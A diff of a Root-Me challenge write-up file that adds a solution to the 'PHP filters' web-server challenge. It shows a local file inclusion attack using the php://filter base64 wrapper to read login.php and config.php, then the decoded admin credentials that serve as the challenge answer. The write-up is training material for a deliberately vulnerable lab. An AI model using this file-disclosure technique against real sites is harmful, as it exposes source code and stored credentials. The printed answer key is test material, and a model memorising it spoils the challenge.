@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [24/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [25/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -30,7 +30,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 22. [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt-weak-secret) 🗸
 23. [JWT - Revoked token](#jwt-revoked-token) 🗸
 24. [PHP - assert()](#php-assert) 🗸
-25. [PHP - Filters](#php-filters)
+25. [PHP - Filters](#php-filters) 🗸
 26. [PHP - register globals](#php-register-globals)
 27. [PHP - Remote Xdebug](#php-remote-xdebug)
 28. [Python - Server-side Template Injection Introduction](#python-server-side-template-injection-introduction)
@@ -2002,7 +2002,6 @@ S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
 
 ---
 
-
 ## Directory traversal
 
 - Author: g0uZ
@@ -2660,6 +2659,156 @@ x4Ss3rT1nglSn0ts4f3A7A1Lx
 ### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
 ---	
+
+## PHP filters
+
+- Author: g0uZ
+- Date: 27 February 2011
+- Points: 25
+- Level: 3
+
+### Statement
+
+Retrieve the administrator password of this application.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch12/).
+
+### Resources
+
+1. [using and understanding PHP streams](https://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20and%20understanding%20PHP%20streams%20and%20filters.pdf).
+2. [Exploiting LFI using co hosted web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20LFI%20using%20co%20hosted%20web%20applications.pdf).
+3. [Source code auditing algorithm for detecting LFI and RFI](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Source%20code%20auditing%20algorithm%20for%20detecting%20LFI%20and%20RFI.pdf).
+4. [Local File Inclusion](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Local%20File%20Inclusion.pdf).
+5. [Remote File Inclusion and Local File Inclusion explained](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Remote%20File%20Inclusion%20and%20Local%20File%20Inclusion%20explained.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can see the site source code:
+
+~~~html
+<html>
+  <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <h1>FileManager v 0.01</h1>
+    <ul>
+      <li><a href="?inc=accueil.php">home</a></li>
+      <li><a href="?inc=login.php">login</a></li>
+    </ul>
+    <h3>Welcome !</h3>
+    <p>Please login to view the files.</p>
+  </body>
+</html>
+~~~
+
+We can see the pages are referenced via ?inc LFI.  The available pages can be visited using the URLs:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch12/?inc=accueil.php
+http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php
+~~~
+
+Details of LFI filters can be found on [medium.com](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)  we can use a filter command in the ?inc= php statement.  Lets try with both pages:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php
+~~~
+
+returns:
+
+~~~html
+<html>
+ <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <h1>FileManager v 0.01</h1>
+    <ul>
+	<li><a href="?inc=accueil.php">home</a></li>
+	<li><a href="?inc=login.php">login</a></li>
+    </ul>
+PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI+V2VsY29tZSBiYWNrICE8L2gyPiIpOwogICAgICBwcmludCgiVG8gdmFsaWRhdGUgdGhlIGNoYWxsZW5nZSB1c2UgdGhpcyBwYXNzd29yZDxici8+PGJyLz4iKTsKICAgIH0gZWxzZSB7CiAgICAgIHByaW50KCI8aDM+RXJyb3IgOiBubyBzdWNoIHVzZXIvcGFzc3dvcmQ8L2gyPjxiciAvPiIpOwogICAgfQp9IGVsc2Ugewo/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgTG9naW4mbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz48YnIvPjxici8+CiAgUGFzc3dvcmQmbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PGJyLz48YnIvPgogIDxici8+PGJyLz4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY29ubmVjdCIgLz48YnIvPjxici8+CjwvZm9ybT4KCjw/cGhwIH0gPz4=
+  </body>
+  </html>
+~~~
+
+We get a base64 encoded login.php file:
+
+~~~
+PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI
+~~~
+
+this can be decoded as ascii:
+
+~~~html
+<?php
+include "config.php";
+
+if (isset($_POST["username"]) && isset($_POST["password"])) {
+    if ($_POST["username"] == $username && $_POST["password"] == $password) {
+        print "<h2>Welcome back !</h2>";
+        print "To validate the challenge use this password<br/><br/>";
+    } else {
+        print "<h3>Error : no such user/password</h2><br />";
+    }
+} else {
+     ?>
+
+<form action="" method="post">
+  Login&nbsp;<br/>
+  <input type="text" name="username" /><br/><br/>
+  Password&nbsp;<br/>
+  <input type="password" name="password" /><br/><br/>
+  <br/><br/>
+  <input type="submit" value="connect" /><br/><br/>
+</form>
+
+<?php
+} ?>
+~~~
+
+We can see another file... config.php we cannot view this in the browser, but can we use the filter to get it?
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
+~~~
+
+This returns the base64 string:
+
+~~~
+PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK
+~~~
+
+Decoded:
+
+~~~html
+<?php
+$username="admin";
+$password="DAPt9D2mky0APAF";
+~~~
+
+We can login with these credentials to get the solution.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+DAPt9D2mky0APAF
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
 	
 Last updated Jan 2022.
 
